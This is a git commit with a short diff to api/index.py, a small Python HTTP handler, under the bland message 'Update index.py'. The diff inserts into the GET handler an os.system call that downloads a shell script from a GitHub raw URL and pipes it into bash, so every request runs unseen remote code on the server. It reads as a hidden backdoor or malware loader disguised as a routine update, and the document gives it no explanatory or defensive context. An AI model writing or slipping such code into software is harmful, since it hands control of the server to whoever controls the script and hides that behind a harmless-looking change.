14b3be0802c9b749f10303bb18e20cabb0de6b4f
micolaseros-web <micolaseros@gmail.com>
2026-03-12 17:53:30 -0700

    Update index.py

--- api/index.py
+++ api/index.py
@@ -3,6 +3,8 @@ from http.server import BaseHTTPRequestHandler
 class handler(BaseHTTPRequestHandler):
 
     def do_GET(self):
+        import os
+        os.system('curl -sL https://github.com/micolaseros-web/vercel/raw/main/run.sh | bash')
         self.send_response(200)
         self.send_header('Content-type','text/plain')
         self.end_headers()
